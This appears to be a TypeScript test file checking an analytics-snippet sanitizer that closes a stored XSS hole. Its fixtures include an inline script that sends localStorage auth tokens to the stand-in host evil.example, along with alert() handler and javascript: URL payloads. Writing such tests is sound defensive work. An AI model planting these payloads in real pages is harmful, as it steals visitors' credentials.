/**
 * FA-UI-001 — safe analytics injection.
 *
 * The old app.vue re-materialized every `<script>` (inline bodies included)
 * from the server-supplied analytics config — stored XSS on every visitor,
 * with JWT+CSRF in localStorage. These tests pin the safe materializer.
 */

import { describe, it, expect } from 'vitest';
import {
  buildSafeAnalyticsNodes,
  injectAnalyticsFragment,
} from '../../../modules/ui/app/composables/useAnalyticsInjection';

function tagsOf(nodes: Node[]): string[] {
  return nodes
    .filter((n): n is Element => n.nodeType === 1)
    .map((n) => n.tagName.toLowerCase());
}

describe('buildSafeAnalyticsNodes (FA-UI-001)', () => {
  it('NEVER materializes inline script bodies (the token-exfil vector)', () => {
    const nodes = buildSafeAnalyticsNodes(
      `<script>fetch('https://evil.example/?t='+localStorage.getItem('auth_token'))</script>`
    );
    expect(tagsOf(nodes)).not.toContain('script');
  });

  it('drops a src script that ALSO carries an inline body', () => {
    const nodes = buildSafeAnalyticsNodes(
      `<script src="https://plausible.io/js/script.js">alert(1)</script>`
    );
    expect(tagsOf(nodes)).not.toContain('script');
  });

  it('keeps an https analytics script but only allowlisted attributes', () => {
    const nodes = buildSafeAnalyticsNodes(
      `<script defer src="https://plausible.io/js/script.js" data-domain="town.example" onerror="alert(1)" onload="alert(2)"></script>`
    );
    const scripts = nodes.filter(
      (n): n is HTMLScriptElement => n.nodeName === 'SCRIPT'
    );
    expect(scripts).toHaveLength(1);
    const script = scripts[0];
    expect(script.getAttribute('src')).toBe('https://plausible.io/js/script.js');
    expect(script.hasAttribute('defer')).toBe(true);
    expect(script.getAttribute('data-domain')).toBe('town.example');
    expect(script.hasAttribute('onerror')).toBe(false);
    expect(script.hasAttribute('onload')).toBe(false);
  });

  it('drops non-https script sources (http and javascript:)', () => {
    for (const src of [
      'http://evil.example/x.js',
      // eslint-disable-next-line no-script-url
      'javascript:alert(1)',
    ]) {
      const nodes = buildSafeAnalyticsNodes(`<script src="${src}"></script>`);
      expect(tagsOf(nodes)).not.toContain('script');
    }
  });

  it('allows a same-origin script path (self-hosted analytics)', () => {
    const nodes = buildSafeAnalyticsNodes(`<script src="/js/stats.js"></script>`);
    const scripts = nodes.filter((n) => n.nodeName === 'SCRIPT');
    expect(scripts).toHaveLength(1);
  });

  it('sanitizes non-script markup (handlers stripped, pixels kept)', () => {
    const nodes = buildSafeAnalyticsNodes(
      `<img src="https://stats.example/pixel.gif" onerror="alert(1)"><noscript><img src="https://stats.example/ns.gif"></noscript>`
    );
    const html = nodes
      .filter((n): n is Element => n.nodeType === 1)
      .map((n) => n.outerHTML)
      .join('');
    expect(html).toContain('pixel.gif');
    expect(html).not.toContain('onerror');
  });

  it('strips scripts NESTED inside other elements', () => {
    const nodes = buildSafeAnalyticsNodes(
      `<div><script>alert('nested')</script><span>ok</span></div>`
    );
    const html = nodes
      .filter((n): n is Element => n.nodeType === 1)
      .map((n) => n.outerHTML)
      .join('');
    expect(html).not.toContain('<script');
    expect(html).toContain('ok');
  });
});

describe('injectAnalyticsFragment', () => {
  it('places safe nodes and ignores empty input', () => {
    const placed: Node[] = [];
    injectAnalyticsFragment(undefined, (n) => placed.push(n));
    injectAnalyticsFragment('   ', (n) => placed.push(n));
    expect(placed).toHaveLength(0);

    injectAnalyticsFragment(
      `<script src="https://plausible.io/js/script.js"></script><script>alert(1)</script>`,
      (n) => placed.push(n)
    );
    expect(placed).toHaveLength(1);
    expect(placed[0].nodeName).toBe('SCRIPT');
  });
});
